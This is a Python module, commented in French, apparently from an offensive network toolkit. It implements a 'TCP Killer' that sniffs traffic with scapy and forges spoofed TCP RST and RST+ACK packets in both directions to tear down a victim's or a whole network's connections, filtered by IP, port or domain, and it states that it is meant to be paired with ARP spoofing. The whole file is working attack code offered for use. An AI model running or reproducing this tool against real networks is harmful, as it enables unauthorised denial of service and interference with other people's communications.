"""
modules/tcp_killer.py
TCP Session Killer ULTRA-ROBUSTE.
- Tue les connexions TCP en envoyant des RST forgés
- Blocage par IP, par port, par domaine (avec résolution DNS)
- Mode agressif: 4x RST dans les deux sens avec prédiction SEQ/ACK
- Intégration avec ARP Spoofing pour voir le trafic
"""
import time
import threading
from typing import List, Set, Dict, Optional, Callable
from dataclasses import dataclass, field

from scapy.all import (
    sniff, send, sendp, IP, TCP, Ether, Raw,
    conf as scapy_conf
)

from core.logger import log
from core.config import conf, attack_conf
from core.utils import resolve_domain, resolve_domains_batch, Counter


@dataclass
class TCPSession:
    """Représente une session TCP traquée."""
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    seq: int = 0
    ack: int = 0
    last_seen: float = field(default_factory=time.time)
    killed: bool = False


class TCPKiller:
    """
    TCP Killer avancé pour couper des connexions de manière chirurgicale.
    
    Fonctionnalités:
    - Blocage par IP cible
    - Blocage par port destination
    - Blocage par domaine (résolution DNS automatique)
    - Mode agressif (multi-RST dans les deux sens)
    - Tracking des sessions pour une précision maximale
    """
    
    def __init__(
        self,
        target_ip: str = None,
        target_ports: List[int] = None,
        blocked_domains: List[str] = None,
        blocked_ips: Set[str] = None,
        blacklist_ports: List[int] = None,
        aggressive: bool = True,
        rst_count: int = None
    ):
        """
        :param target_ip: IP de la machine victime (None = toutes)
        :param target_ports: Ports destination à cibler (None = tous)
        :param blocked_domains: Domaines à bloquer (ex: ["youtube.com", "*.tiktok.com"])
        :param blocked_ips: IPs serveur à bloquer directement
        :param blacklist_ports: Ports à ne JAMAIS toucher (ex: [22] pour SSH)
        :param aggressive: Mode agressif (multiple RST)
        :param rst_count: Nombre de RST à envoyer par direction
        """
        self.target_ip = target_ip
        self.target_ports = set(target_ports) if target_ports else set()
        self.blocked_domains = blocked_domains or []
        self.blocked_ips: Set[str] = blocked_ips or set()
        self.blacklist_ports = set(blacklist_ports or attack_conf.TCP_BLACKLIST_PORTS)
        self.aggressive = aggressive
        self.rst_count = rst_count or attack_conf.RST_PACKET_COUNT
        
        # État
        self.running = False
        self._thread: Optional[threading.Thread] = None
        self._dns_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        
        # Stats
        self.kill_counter = Counter()
        self.start_time: float = 0.0
        
        # Cache des sessions (pour le tracking SEQ/ACK avancé)
        self._sessions: Dict[str, TCPSession] = {}
    
    def _resolve_domains_loop(self):
        """Thread de résolution DNS continue pour les domaines bloqués."""
        while self.running:
            if self.blocked_domains:
                new_ips = set()
                
                for domain in self.blocked_domains:
                    # Gestion des wildcards basiques
                    clean_domain = domain.replace("*.", "").replace(".*", "")
                    
                    try:
                        ips = resolve_domain(clean_domain)
                        new_ips.update(ips)
                        
                        # Aussi résoudre les sous-domaines courants
                        for prefix in ["www", "m", "mobile", "api"]:
                            sub_ips = resolve_domain(f"{prefix}.{clean_domain}")
                            new_ips.update(sub_ips)
                    except Exception:
                        pass
                
                with self._lock:
                    # Ajouter les nouvelles IPs sans supprimer les manuelles
                    self.blocked_ips.update(new_ips)
                
                if new_ips:
                    log.info(f"DNS: {len(new_ips)} IPs résolues pour {len(self.blocked_domains)} domaine(s)")
            
            # Rafraîchir toutes les 30 secondes
            for _ in range(30):
                if not self.running:
                    break
                time.sleep(1)
    
    def _should_kill(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> bool:
        """Détermine si une connexion doit être tuée."""
        # Vérifier la blacklist de ports (NE JAMAIS toucher)
        if src_port in self.blacklist_ports or dst_port in self.blacklist_ports:
            return False
        
        # Si on a une cible IP spécifique
        if self.target_ip:
            if src_ip != self.target_ip and dst_ip != self.target_ip:
                return False
        
        # Si on a des ports cibles spécifiques
        if self.target_ports:
            if dst_port not in self.target_ports and src_port not in self.target_ports:
                return False
        
        # Si on a des IPs/domaines bloqués
        if self.blocked_ips:
            with self._lock:
                if dst_ip not in self.blocked_ips and src_ip not in self.blocked_ips:
                    return False
        
        return True
    
    def _send_rst_aggressive(self, src_ip: str, dst_ip: str, 
                             src_port: int, dst_port: int,
                             seq: int, ack: int):
        """
        Envoie des RST agressifs dans les DEUX sens.
        C'est la technique la plus efficace pour vraiment tuer une connexion.
        """
        try:
            # Direction 1: RST vers la destination (on spoof la source)
            # Plusieurs tentatives avec des SEQ légèrement différents
            for i in range(self.rst_count):
                rst_to_dst = IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=src_port,
                    dport=dst_port,
                    flags="R",
                    seq=seq + i * 1000  # Variation du SEQ
                )
                send(rst_to_dst, verbose=False, iface=conf.interface)
            
            # Direction 2: RST vers la source (on spoof la destination)
            for i in range(self.rst_count):
                rst_to_src = IP(src=dst_ip, dst=src_ip) / TCP(
                    sport=dst_port,
                    dport=src_port,
                    flags="R",
                    seq=ack + i * 1000
                )
                send(rst_to_src, verbose=False, iface=conf.interface)
            
            # Bonus: RST+ACK (certains systèmes les acceptent mieux)
            rst_ack = IP(src=dst_ip, dst=src_ip) / TCP(
                sport=dst_port,
                dport=src_port,
                flags="RA",
                seq=ack,
                ack=seq + 1
            )
            send(rst_ack, verbose=False, iface=conf.interface)
            
        except Exception as e:
            log.warning(f"Erreur envoi RST: {e}")
    
    def _send_rst_simple(self, src_ip: str, dst_ip: str,
                         src_port: int, dst_port: int, seq: int):
        """Envoi RST simple (moins agressif)."""
        try:
            rst = IP(src=dst_ip, dst=src_ip) / TCP(
                sport=dst_port,
                dport=src_port,
                flags="R",
                seq=seq
            )
            send(rst, verbose=False, iface=conf.interface)
        except Exception:
            pass
    
    def _packet_callback(self, pkt):
        """Callback pour chaque paquet TCP sniffé."""
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
            return
        
        ip_layer = pkt[IP]
        tcp_layer = pkt[TCP]
        
        src_ip = ip_layer.src
        dst_ip = ip_layer.dst
        src_port = tcp_layer.sport
        dst_port = tcp_layer.dport
        seq = tcp_layer.seq
        ack = tcp_layer.ack
        flags = tcp_layer.flags
        
        # Ignorer nos propres paquets RST
        if "R" in str(flags) and src_ip == conf.attacker_ip:
            return
        
        # Vérifier si on doit tuer cette connexion
        if not self._should_kill(src_ip, dst_ip, src_port, dst_port):
            return
        
        # Cibler les paquets avec données ou les SYN-ACK (établissement)
        # SYN = 0x02, ACK = 0x10, SYN-ACK = 0x12, PSH = 0x08
        flags_int = int(flags)
        
        # On tue sur: SYN-ACK, ACK avec données, PSH-ACK
        should_rst = False
        
        if flags_int & 0x12 == 0x12:  # SYN-ACK (on tue dès l'établissement)
            should_rst = True
        elif flags_int & 0x10 and pkt.haslayer(Raw):  # ACK avec données
            should_rst = True
        elif flags_int & 0x18:  # PSH-ACK
            should_rst = True
        elif flags_int & 0x10 and not (flags_int & 0x02):  # ACK simple (keepalive)
            should_rst = True
        
        if should_rst:
            if self.aggressive:
                self._send_rst_aggressive(src_ip, dst_ip, src_port, dst_port, seq, ack)
            else:
                self._send_rst_simple(src_ip, dst_ip, src_port, dst_port, ack)
            
            count = self.kill_counter.increment()
            
            # Log périodique
            if count % 10 == 0:
                log.attack(f"TCP Kill #{count}: {src_ip}:{src_port} <-> {dst_ip}:{dst_port}")
    
    def _build_bpf_filter(self) -> str:
        """Construit le filtre BPF pour le sniff."""
        filters = ["tcp"]
        
        if self.target_ip:
            filters.append(f"host {self.target_ip}")
        
        if self.target_ports and len(self.target_ports) <= 5:
            port_filter = " or ".join(f"port {p}" for p in self.target_ports)
            filters.append(f"({port_filter})")
        
        return " and ".join(filters)
    
    def start(self):
        """Démarre le TCP Killer."""
        if self.running:
            return
        
        self.running = True
        self.start_time = time.time()
        
        # Démarrer la résolution DNS si on a des domaines
        if self.blocked_domains:
            log.info(f"Blocage des domaines: {', '.join(self.blocked_domains)}")
            self._dns_thread = threading.Thread(target=self._resolve_domains_loop, daemon=True)
            self._dns_thread.start()
            
            # Attendre la première résolution
            time.sleep(1)
        
        # Log de démarrage
        mode = "AGRESSIF" if self.aggressive else "NORMAL"
        target_info = self.target_ip or "Tout le réseau"
        log.attack(f"TCP Killer démarré - Mode {mode}")
        log.info(f"  Cible: {target_info}")
        if self.target_ports:
            log.info(f"  Ports ciblés: {self.target_ports}")
        if self.blocked_ips:
            log.info(f"  IPs bloquées: {len(self.blocked_ips)}")
        log.info(f"  Blacklist: {self.blacklist_ports}")
        
        # Démarrer le sniff
        bpf = self._build_bpf_filter()
        log.info(f"  Filtre BPF: {bpf}")
        
        def sniff_loop():
            try:
                sniff(
                    iface=conf.interface,
                    filter=bpf,
                    prn=self._packet_callback,
                    stop_filter=lambda x: not self.running,
                    store=0
                )
            except Exception as e:
                if self.running:
                    log.error(f"Erreur sniff TCP: {e}")
        
        self._thread = threading.Thread(target=sniff_loop, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Arrête le TCP Killer."""
        if not self.running:
            return
        
        self.running = False
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        
        if self._dns_thread and self._dns_thread.is_alive():
            self._dns_thread.join(timeout=2.0)
        
        duration = time.time() - self.start_time
        log.success(
            f"TCP Killer arrêté. "
            f"Durée: {duration:.1f}s, "
            f"Connexions tuées: {self.kill_counter.value}"
        )
    
    def add_blocked_domain(self, domain: str):
        """Ajoute un domaine à bloquer à chaud."""
        if domain not in self.blocked_domains:
            self.blocked_domains.append(domain)
            # Résolution immédiate
            ips = resolve_domain(domain)
            with self._lock:
                self.blocked_ips.update(ips)
            log.info(f"Domaine ajouté: {domain} ({len(ips)} IPs)")
    
    def add_blocked_ip(self, ip: str):
        """Ajoute une IP à bloquer à chaud."""
        with self._lock:
            self.blocked_ips.add(ip)
        log.info(f"IP bloquée: {ip}")
    
    def get_stats(self) -> dict:
        """Retourne les statistiques."""
        return {
            "running": self.running,
            "kills": self.kill_counter.value,
            "duration": time.time() - self.start_time if self.start_time else 0,
            "blocked_domains": len(self.blocked_domains),
            "blocked_ips": len(self.blocked_ips),
            "target": self.target_ip,
            "target_ports": list(self.target_ports)
        }
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, *args):
        self.stop()
        return False